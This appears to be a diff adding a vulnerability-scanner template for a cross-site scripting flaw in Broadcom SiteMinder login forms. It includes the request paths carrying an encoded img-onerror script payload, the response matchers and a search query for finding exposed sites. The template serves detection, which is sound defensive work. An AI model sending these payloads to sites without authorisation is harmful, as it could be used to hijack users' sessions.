@@ -1,0 +1,47 @@
+http:
+- matchers:
+  - condition: or
+    type: word
+    words:
+    - \u003d\u0022confirm(document.domain)\u0022\u003e</B> you cannot access your
+    - \u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e</B> you cannot access
+      your
+  - part: header
+    type: word
+    words:
+    - text/html
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7'
+  - '{{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7'
+  - '{{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e&SMAUTHREASON=7'
+  - '{{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e&SMAUTHREASON=7'
+  stop-at-first-match: true
+id: siteminder-dom-xss
+info:
+  author: clarkvoss
+  classification:
+    cpe: cpe:2.3:a:broadcom:siteminder:*:*:*:*:*:*:*:*
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  description: SiteMinder contains a cross-site scripting vulnerability in the document
+    object model. An attacker can execute arbitrary script in the browser of an unsuspecting
+    user in the context of the affected site. This can allow the attacker to steal
+    cookie-based authentication credentials and launch other attacks.
+  metadata:
+    google-query: inurl:"smpwservices.fcc"
+    max-request: 2
+    product: siteminder
+    vendor: broadcom
+    verified: true
+  name: SiteMinder - DOM Cross-Site Scripting
+  reference:
+  - https://blog.reigningshells.com/2019/12/reviving-old-cves-reflected-xss-in-ca.html
+  - https://github.com/projectdiscovery/nuclei-templates/issues/2736
+  severity: high
+  tags: dom,xss,siteminder,vuln
